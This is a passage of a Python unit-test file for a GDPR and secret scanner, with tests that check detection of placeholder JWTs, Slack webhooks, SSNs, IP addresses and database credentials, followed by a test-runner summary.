                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    db_findings = [f for f in findings if any(term in f.get('type', '').lower() 
                                                            for term in ['database', 'connection', 'uri'])]
                    self.assertGreater(len(db_findings), 0, f"Should detect database connection in: {content}")
                    
                os.unlink(f.name)
                
    def test_11_jwt_token_detection(self):
        """Test detection of JWT tokens"""
        test_cases = [
            ('jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"', True),
            ('token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."', True),
            ('random = "not.a.jwt"', False),
            ('comment = "JWT token needed"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    jwt_findings = [f for f in findings if 'jwt' in f.get('type', '').lower() or 'token' in f.get('type', '').lower()]
                    self.assertGreater(len(jwt_findings), 0, f"Should detect JWT in: {content}")
                    
                os.unlink(f.name)
                
    def test_12_slack_webhook_detection(self):
        """Test detection of Slack webhooks and tokens"""
        test_cases = [
            ('webhook = "https://hooks.slack.com/services/T12345678/B12345678/abcdefghijklmnopqrstuvwx"', True),
            ('slack_token = "xoxb-1234567890-abcdefghijklmnopqrstuvwx"', True),
            ('slack_app = "xoxp-1234567890-abcdefghijklmnopqrstuvwx"', True),
            ('url = "https://example.com/webhook"', False)
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    slack_findings = [f for f in findings if 'slack' in f.get('type', '').lower()]
                    self.assertGreater(len(slack_findings), 0, f"Should detect Slack credential in: {content}")
                    
                os.unlink(f.name)
                
    def test_13_social_security_detection(self):
        """Test detection of social security numbers"""
        test_cases = [
            ('ssn = "123-45-6789"', True),
            ('social = "123456789"', True),
            ('id_number = "12345"', False),  # Too short
            ('not_ssn = "abc-de-fghi"', False)  # Non-numeric
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    ssn_findings = [f for f in findings if any(term in f.get('type', '').lower() 
                                                             for term in ['ssn', 'social', 'security'])]
                    self.assertGreater(len(ssn_findings), 0, f"Should detect SSN in: {content}")
                    
                os.unlink(f.name)
                
    def test_14_ip_address_detection(self):
        """Test detection of IP addresses"""
        test_cases = [
            ('server_ip = "192.168.1.100"', True),
            ('host = "10.0.0.1"', True),
            ('public_ip = "8.8.8.8"', True),
            ('version = "1.2.3"', False),  # Version number, not IP
            ('not_ip = "999.999.999.999"', False)  # Invalid IP
        ]
        
        for content, should_detect in test_cases:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(content)
                f.flush()
                
                results = self.scanner.scan_file(f.name)
                findings = results.get('findings', [])
                
                if should_detect:
                    ip_findings = [f for f in findings if 'ip' in f.get('type', '').lower()]
                    self.assertGreater(len(ip_findings), 0, f"Should detect IP address in: {content}")
                    
                os.unlink(f.name)
                
    def test_15_comprehensive_multi_violation_detection(self):
        """Test detection of multiple violations in single file"""
        complex_content = '''
        # Configuration file with multiple violations
        database_url = "postgresql://admin:secret123@db.company.com:5432/prod"
        api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"
        email_admin = "admin@company.com"
        github_token = "ghp_abcdefghijklmnopqrstuvwxyz123456"
        customer_phone = "+31-6-87654321"
        backup_server = "192.168.100.50"
        ssl_cert = "-----BEGIN CERTIFICATE-----\\nMIIEpDCCAowCAQAwDQYJKoZIhvcNAQEBBQAEggSjMIIEngIBAAKCAQEA..."
        slack_webhook = "https://hooks.slack.com/services/T12345678/B12345678/abcdefghijklmnopqrstuvwx"
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(complex_content)
            f.flush()
            
            results = self.scanner.scan_file(f.name)
            findings = results.get('findings', [])
            
            # Should detect multiple types of violations
            self.assertGreaterEqual(len(findings), 5, "Should detect multiple violations")
            
            # Check for specific violation types
            violation_types = [f.get('type', '').lower() for f in findings]
            expected_types = ['email', 'password', 'api', 'token', 'database']
            
            found_types = 0
            for expected_type in expected_types:
                if any(expected_type in vtype for vtype in violation_types):
                    found_types += 1
                    
            self.assertGreaterEqual(found_types, 3, "Should detect at least 3 different violation types")
            
            os.unlink(f.name)

if __name__ == '__main__':
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestGDPRScannerFunctionality,
        TestGDPRScannerPerformance, 
        TestGDPRScannerSecurity,
        TestGDPRScannerViolationDetection
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\\n{'='*60}")
    print(f"GDPR SCANNER TEST SUMMARY")
    print(f"{'='*60}")
    print(f"Total Tests: {result.testsRun}")
    print(f"Passed: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failed: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success Rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")